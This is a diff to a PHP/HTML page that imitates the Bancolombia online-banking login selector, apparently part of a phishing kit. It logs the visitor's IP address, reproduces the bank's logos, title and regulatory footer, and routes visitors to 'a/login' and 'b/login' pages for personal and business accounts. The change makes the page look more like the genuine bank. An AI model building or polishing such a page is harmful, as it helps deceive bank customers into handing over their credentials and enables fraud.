@@ -2,124 +2,225 @@
 $ip = getenv("REMOTE_ADDR");
 require_once __DIR__ . '/a/fecha_es.php';
 $tiempo = b34f9_fecha_larga();
-?>
-<html>
-    <head>
-        <title>Bancolombia Sucursal Virtual</title>
-        <meta http-equiv="content-type" content="text/html; utf-8">
-        <meta charset="utf-8">
+?><!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Bancolombia | Iniciar sesión</title>
+<link rel="icon" href="img/logo.svg">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+  background: #f0f0f5;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
 
-        <meta content="es" http-equiv="Content-Language">
+/* HEADER */
+.header {
+  background: white;
+  padding: 16px 24px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid #e8e8e8;
+}
+.header-logo img {
+  height: 36px;
+  width: auto;
+}
+.btn-salir {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 15px;
+  font-weight: 600;
+  color: #333;
+  text-decoration: none;
+  background: none;
+  border: none;
+  cursor: pointer;
+}
+.btn-salir svg { width: 18px; height: 18px; }
 
-        <meta name="description" content="">
-        <meta name="author" content="">
-        <meta name="Copyright" content="">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+/* CONTENIDO */
+.main {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  padding: 40px 20px 30px;
+}
+.titulo {
+  font-size: 26px;
+  font-weight: 700;
+  color: #111;
+  margin-bottom: 8px;
+  text-align: center;
+}
+.subtitulo {
+  font-size: 16px;
+  color: #444;
+  margin-bottom: 32px;
+  text-align: center;
+}
 
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-        <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@700;800&display=swap" rel="stylesheet">
+/* CARDS */
+.cards {
+  width: 100%;
+  max-width: 480px;
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+.card {
+  background: white;
+  border-radius: 12px;
+  display: flex;
+  align-items: stretch;
+  text-decoration: none;
+  box-shadow: 0 1px 6px rgba(0,0,0,0.08);
+  overflow: hidden;
+  transition: box-shadow 0.2s;
+}
+.card:hover { box-shadow: 0 4px 16px rgba(0,0,0,0.13); }
+.card-body {
+  flex: 1;
+  padding: 20px 18px;
+}
+.card-title {
+  font-size: 17px;
+  font-weight: 700;
+  color: #111;
+  margin-bottom: 6px;
+}
+.card-desc {
+  font-size: 14px;
+  color: #555;
+  line-height: 1.5;
+}
+.card-arrow {
+  width: 56px;
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  border-radius: 0 12px 12px 0;
+}
+.card-arrow svg {
+  width: 22px;
+  height: 22px;
+  color: white;
+}
+.card-personas .card-arrow { background: #f5a623; }
+.card-empresas .card-arrow { background: #e05a1e; }
 
-        <script src="https://kit.fontawesome.com/45b9078c9f.js" crossorigin="anonymous"></script>
-        <link href="css/stylesheet.css" rel="stylesheet">
-        <link href="css/style-app.css?v2" rel="stylesheet">
-        <link rel="icon" type="image/png" href="img/logo.png" />
-        <script type="text/javascript" src="../../../../js/jquery-3.6.0.min.js"></script>
-        <script src="../../../../js/jquery.jclock-min.js" type="text/javascript"></script>
+/* AYUDA */
+.ayuda {
+  margin-top: 36px;
+  font-size: 14px;
+  color: #444;
+  text-align: center;
+}
+.ayuda a {
+  color: #111;
+  font-weight: 600;
+  text-decoration: underline;
+}
 
-        <style type="text/css">
-            .selector-container {
-                display: flex;
-                gap: 20px;
-                margin-top: 40px;
-                justify-content: center;
-                flex-wrap: wrap;
-            }
+/* FOOTER */
+.footer {
+  background: white;
+  padding: 20px 24px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 10px;
+  border-top: 1px solid #e8e8e8;
+}
+.footer-logo img { height: 28px; width: auto; }
+.footer-vigilado {
+  font-size: 10px;
+  color: #888;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  display: flex;
+  align-items: center;
+  gap: 4px;
+}
+.footer-vigilado span { font-weight: 700; }
 
-            .selector-card {
-                width: 280px;
-                padding: 30px;
-                border: 2px solid #ddd;
-                border-radius: 8px;
-                text-align: center;
-                cursor: pointer;
-                transition: all 0.3s ease;
-                background: #fff;
-            }
+@media (max-width: 480px) {
+  .titulo { font-size: 22px; }
+  .subtitulo { font-size: 14px; }
+  .card-title { font-size: 16px; }
+  .card-body { padding: 16px 14px; }
+  .card-arrow { width: 48px; }
+}
+</style>
+</head>
+<body>
 
-            .selector-card:hover {
-                border-color: #1a1b1a;
-                box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-                transform: translateY(-2px);
-            }
+<header class="header">
+  <div class="header-logo">
+    <img src="img/logo.svg" alt="Bancolombia">
+  </div>
+  <a href="/" class="btn-salir">
+    Salir
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+      <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
+      <polyline points="16 17 21 12 16 7"/>
+      <line x1="21" y1="12" x2="9" y2="12"/>
+    </svg>
+  </a>
+</header>
 
-            .selector-card i {
-                font-size: 48px;
-                color: #1a1b1a;
-                margin-bottom: 15px;
-            }
+<main class="main">
+  <h1 class="titulo">Iniciar sesión</h1>
+  <p class="subtitulo">Elige cómo quieres continuar:</p>
 
-            .selector-card h3 {
-                font-size: 18px;
-                font-weight: bold;
-                color: #1a1b1a;
-                margin: 10px 0;
-            }
+  <div class="cards">
 
-            .selector-card p {
-                font-size: 13px;
-                color: #666;
-                margin: 10px 0 0 0;
-            }
-        </style>
-    </head>
-    <body>
-        <div id="fondo"></div>
-        <div id="cargando">
-            <img src="img/logo.svg">
-            <br>
-            <img src="img/load2.gif" />
-        </div>
+    <a href="a/login" class="card card-personas">
+      <div class="card-body">
+        <div class="card-title">Bancolombia Personas</div>
+        <div class="card-desc">Si manejas tus cuentas y productos en la Sucursal Virtual Personas y app Mi Bancolombia.</div>
+      </div>
+      <div class="card-arrow">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"/>
+        </svg>
+      </div>
+    </a>
 
-        <table width="100%" border="0" cellpadding="0" cellspacing="0">
-            <tr>
-                <td valign="middle" align="left" width="33%"><img src="img/btn-cerrar.jpg" height="29"></td>
-                <td valign="middle" align="center" width="34%"><img src="img/logo-app.jpg" height="29"></td>
-                <td valign="middle" align="right" width="33%"></td>
-            </tr>
-        </table>
+    <a href="b/login" class="card card-empresas">
+      <div class="card-body">
+        <div class="card-title">Bancolombia Empresas</div>
+        <div class="card-desc">Si manejas tus productos en la Sucursal Virtual Empresas y aún no te has cambiado al nuevo canal.</div>
+      </div>
+      <div class="card-arrow">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <polyline points="9 18 15 12 9 6"/>
+        </svg>
+      </div>
+    </a>
 
-        <img src="img/logo.svg" width="260" style="margin-top: 48px;margin-bottom: 34px;">
-        <div class="titulo-app">¿Qué tipo de cliente eres?</div>
-        <div class="descripcion-app">Selecciona tu tipo de cuenta para continuar</div>
+  </div>
 
-        <div class="selector-container">
-            <div class="selector-card" onclick="irPersonas()">
-                <i class="fas fa-user"></i>
-                <h3>Personas</h3>
-                <p>Acceso para clientes personas naturales</p>
-            </div>
+  <p class="ayuda">¿No sabes cuál elegir? <a href="#">Te contamos aquí</a></p>
+</main>
 
-            <div class="selector-card" onclick="irEmpresas()">
-                <i class="fas fa-building"></i>
-                <h3>Empresas</h3>
-                <p>Acceso para clientes empresa</p>
-            </div>
-        </div>
+<footer class="footer">
+  <div class="footer-logo">
+    <img src="img/logo.svg" alt="Bancolombia">
+  </div>
+  <div class="footer-vigilado">
+    Vigilado <span>Superintendencia Financiera</span>
+  </div>
+</footer>
 
-        <script type="text/javascript">
-            function irPersonas() {
-                window.location.href = "a/login";
-            }
-
-            function irEmpresas() {
-                window.location.href = "b/login";
-            }
-
-            $(document).ready(function() {
-                // Opcional: animación al cargar
-            });
-        </script>
-    </body>
+</body>
 </html>
